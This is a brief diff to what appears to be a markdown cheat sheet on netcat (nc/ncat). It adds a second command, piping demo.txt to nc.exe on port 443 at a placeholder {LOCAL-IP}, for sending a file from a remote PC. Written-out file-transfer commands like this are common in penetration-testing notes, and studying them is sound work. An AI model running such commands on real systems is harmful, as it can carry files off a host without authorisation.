@@ -90,6 +90,8 @@ NC / Ncat -
 **Run NC Client on Remote PC**
     
     nc -v {LOCAL-IP} 443 < demo.txt
+                    OR
+    cat demo.txt | nc.exe -v {LOCAL-IP} 443
 ------------------------------------------------------------------------------------------------------------------
 
 </br>
